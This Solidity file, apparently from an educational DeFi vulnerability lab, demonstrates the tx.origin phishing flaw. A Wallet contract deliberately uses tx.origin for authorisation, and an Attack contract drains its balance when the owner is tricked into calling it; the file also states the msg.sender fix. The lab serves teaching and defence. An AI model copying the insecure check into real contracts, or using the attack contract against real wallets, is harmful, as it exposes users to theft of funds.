// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiVulnLabs
// Vulnerability: tx.origin Phishing
pragma solidity ^0.8.15;

/*
Name: Insecure tx.origin Vulnerability

Description:
tx.origin is a global variable in Solidity; using this variable for authentication
makes the contract vulnerable to phishing attacks.

Scenario:
Wallet is a simple contract where only the owner should be able to transfer Ether.
Wallet.transfer() uses tx.origin to check that the caller is the owner.
An attacker can trick the owner into calling a malicious contract that then
calls Wallet.transfer(), bypassing the authentication.

Mitigation:
Use msg.sender instead of tx.origin for authorization.
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // VULNERABILITY: Using tx.origin for authentication
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

// Attack contract that exploits tx.origin
contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
